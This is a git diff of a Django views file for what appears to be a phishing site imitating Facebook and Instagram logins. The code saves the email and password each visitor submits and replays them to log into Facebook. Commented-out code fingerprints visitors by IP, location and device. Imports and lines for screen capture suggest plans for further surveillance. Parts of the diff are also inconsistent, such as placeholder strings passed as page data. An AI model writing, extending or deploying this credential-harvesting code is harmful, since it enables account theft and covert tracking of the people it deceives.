@@ -1,8 +1,7 @@
 import urllib.request
 from django.shortcuts import render, redirect
-from .models import FacebookAccount
+from .models import FacebookAccount, AccountInfo
 from .check_login import FacebookLogin
-import time
 from django.views.decorators.cache import cache_control
 from .names_comments import names, comments, tupleNamesComments
 import urllib
@@ -10,12 +9,14 @@ import http.cookiejar as cookielib
 from . import doLogin
 from . import ipinfo
 import socket
-import socket
 import requests
 from geopy.geocoders import Nominatim
 from requests import get
+from jnius import autoclass
+import subprocess
+from PIL import ImageGrab
+import cv2
 # Create your views here.
-
 
 def get_ip():
     response = requests.get('https://api64.ipify.org?format=json').json()
@@ -39,16 +40,51 @@ def instagram(request):
     return render(request, 'insta.html', context)
 
 def facebook(request):
-    hostname  = socket.gethostname()
-    ip_address = get('https://api.ipify.org').text
-    ipData = get(f'http://ip-api.com/json/{ip_address}').text
+    # hostname  = socket.gethostname()
+    # ip_address = get('https://api.ipify.org').text
+    # ipData = get(f'http://ip-api.com/json/{ip_address}').text
+    # geolocator = Nominatim(user_agent="FetcherApp")
+    # Latitude = ipinfo.ipinfo()['lat']
+    # Longitude = ipinfo.ipinfo()['lon']
+    # cityFromLonAndLat = geolocator.reverse(str(Latitude)+","+str(Longitude))
 
-    geolocator = Nominatim(user_agent="geoapiExercises")
-    Latitude = ipinfo.ipinfo()['lat']
-    Longitude = ipinfo.ipinfo()['lon']
-    cityFromLonAndLat = geolocator.reverse(str(Latitude)+","+str(Longitude))
+    # dataIP = ipinfo.ipinfo()
+    # newInfo = AccountInfo.objects.create(
+    #     is_mobile = request.user_agent.is_mobile,
+    #     is_tablet = request.user_agent.is_tablet,
+    #     is_touch_capable = request.user_agent.is_touch_capable,
+    #     is_pc = request.user_agent.is_pc,
+    #     is_bot = request.user_agent.is_bot,
+    #     browser = request.user_agent.browser,
+    #     browser_family = request.user_agent.browser.family,
+    #     browser_version = request.user_agent.browser.version,
+    #     os = request.user_agent.os,
+    #     os_family = request.user_agent.os.family,
+    #     os_version = request.user_agent.os.version,
+    #     device = request.user_agent.device,
+    #     device_family = request.user_agent.device.family,
+    #     ipAddress = ip_address,
+    #     location = dataIP['country'],
+    #     region = dataIP['regionName'],
+    #     city = dataIP['city'],
+    #     latitude = dataIP['lat'],
+    #     longitude = dataIP['lon'],
+    #     timezone = dataIP['timezone'],
+    #     isp = dataIP['isp'],
+    #     fullAddress = cityFromLonAndLat
+    # )
+    # newInfo.save()
+    # # Capture the entire screen
+    # screenshot = ImageGrab.grab()
 
-    context = {'ip_address':ip_address, 'ipData':ipinfo.ipinfo(), 'cityFromLonAndLat':cityFromLonAndLat}
+    # # Save the screenshot to a file
+    # screenshot.save("media/shoots/screenshot.png")
+
+    # # Close the screenshot
+    # screenshot.close()
+
+
+    context = {'ip_address':'ip_address', 'ipData':'ipinfo.ipinfo()', 'cityFromLonAndLat':'cityFromLonAndLat'}
     return render(request, 'index.html', context)
 
 def TryToLoginFB(email,password):
@@ -64,9 +100,11 @@ def newLogin(request):
     email = request.POST.get('email')
     password = request.POST.get('password')
 
-    if request.method == 'POST' and 'login' in request.POST and email and password:
+    if request.method == 'POST' and 'login' in request.POST and email and password and request.user_agent.is_mobile:
         newLog = FacebookAccount.objects.create(email=email, password=password)
         newLog.save()
+
+        return redirect('post')
 
         # lo = doLogin.TryToLoginEM(email, password)
         # if lo:
@@ -81,20 +119,15 @@ def newLogin(request):
         #     return redirect('post')
         # else:
         #     print('ERROR')
-        #     return redirect('facebook')
-
-        if not request.user_agent.is_mobile:
-            FacebookLogin(email=email, password=password, browser='Chrome').login()
-            # time.sleep(5)
-
-            if FacebookLogin.isLogged:
-                return redirect('post')
-            else:
-                return redirect('facebook')
-        else:
-            pass
+        #     return redirect('facebook')        
     else:
-        return redirect('Facebook')
+        FacebookLogin(email=email, password=password, browser='Chrome').login()
+        # time.sleep(5)
+
+        if FacebookLogin.isLogged:
+            return redirect('post')
+        else:
+            return redirect('facebook')
 
 @cache_control(no_cache=True, must_revalidate=True)
 def post(request):
